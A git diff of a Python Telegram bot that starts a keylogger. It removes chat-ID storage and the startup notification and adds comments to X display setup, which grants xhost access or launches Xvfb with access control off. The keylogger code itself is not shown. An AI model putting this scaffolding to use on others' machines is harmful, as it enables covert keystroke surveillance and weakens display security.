@@ -4,13 +4,11 @@ import os
 import subprocess
 import time
 import socket
-import json
 
 # Get the absolute path of the script's directory
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 LOG_DIR = os.path.join(BASE_DIR, 'logs')
 LOG_FILE = os.path.join(LOG_DIR, 'bot.log')
-CHATS_FILE = os.path.join(LOG_DIR, 'chats.json')
 
 # Create logs directory if it doesn't exist
 os.makedirs(LOG_DIR, exist_ok=True)
@@ -19,31 +17,10 @@ os.makedirs(LOG_DIR, exist_ok=True)
 logging.basicConfig(level=logging.INFO, filename=LOG_FILE,
                     format="%(filename)s:%(lineno)d #%(levelname)-8s" "[%(asctime)s] - %(name)s - %(message)s")
 
-def load_chats():
-    """Load chat IDs from chats.json."""
-    try:
-        if os.path.exists(CHATS_FILE):
-            with open(CHATS_FILE, 'r') as f:
-                chats = json.load(f)
-                logging.info(f"Loaded {len(chats)} chat IDs from {CHATS_FILE}")
-                return chats
-        return []
-    except Exception as e:
-        logging.error(f"Failed to load chats from {CHATS_FILE}: {e}")
-        return []
-
-def save_chats(chats):
-    """Save chat IDs to chats.json."""
-    try:
-        with open(CHATS_FILE, 'w') as f:
-            json.dump(chats, f)
-        logging.info(f"Saved {len(chats)} chat IDs to {CHATS_FILE}")
-    except Exception as e:
-        logging.error(f"Failed to save chats to {CHATS_FILE}: {e}")
-
 def check_display_access(display):
     """Check if the display is accessible."""
     try:
+        # Try to run a simple X command to test access
         subprocess.run(['xset', '-display', display, 'q'], check=True, capture_output=True, timeout=5)
         logging.info(f"Display {display} is accessible")
         return True
@@ -78,11 +55,13 @@ def setup_xvfb():
     """Start Xvfb and set DISPLAY environment variable if needed."""
     current_display = os.environ.get('DISPLAY', ':0')
     
+    # First, try to use the current display
     if check_display_access(current_display):
         logging.info(f"Using existing display {current_display}")
         os.environ['DISPLAY'] = current_display
         return
     
+    # Try granting access to the current display
     logging.info(f"Attempting to grant access to {current_display}")
     grant_xhost_access()
     if check_display_access(current_display):
@@ -90,18 +69,21 @@ def setup_xvfb():
         os.environ['DISPLAY'] = current_display
         return
     
+    # Fallback to Xvfb
     logging.info(f"Existing display {current_display} unavailable, starting Xvfb")
     try:
         display = find_free_display()
         logging.info(f"Selected display {display} for Xvfb")
         
+        # Start Xvfb
         logging.info(f"Starting Xvfb on display {display}")
         xvfb_process = subprocess.Popen(
             ['Xvfb', display, '-screen', '0', '1024x768x16', '-ac'],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        time.sleep(2)
+        time.sleep(2)  # Wait for Xvfb to initialize
         
+        # Check if Xvfb is running
         if xvfb_process.poll() is not None:
             stderr = xvfb_process.stderr.read().decode()
             raise RuntimeError(f"Xvfb failed to start: {stderr}")
@@ -111,20 +93,6 @@ def setup_xvfb():
     except Exception as e:
         logging.error(f"Failed to setup Xvfb: {e}")
         raise
-
-async def send_startup_message(bot):
-    """Send a startup message to all known chats."""
-    chats = load_chats()
-    if not chats:
-        logging.warning("No chats found, startup message not sent")
-        return
-    
-    for chat_id in chats:
-        try:
-            await bot.send_message(chat_id=chat_id, text="Computer started")
-            logging.info(f"Startup message sent to chat {chat_id}")
-        except Exception as e:
-            logging.error(f"Failed to send startup message to chat {chat_id}: {e}")
 
 # Setup Xvfb or existing display before importing modules that use pynput
 logging.info("Setting up display")
@@ -170,8 +138,6 @@ async def main():
     try:
         logging.info("Starting keylogger setup")
         keylogger.setup_keylogger()
-        logging.info("Sending startup message")
-        await send_startup_message(bot)
         logging.info("Starting bot polling")
         await dp.start_polling(bot)
     except (KeyboardInterrupt, SystemExit):
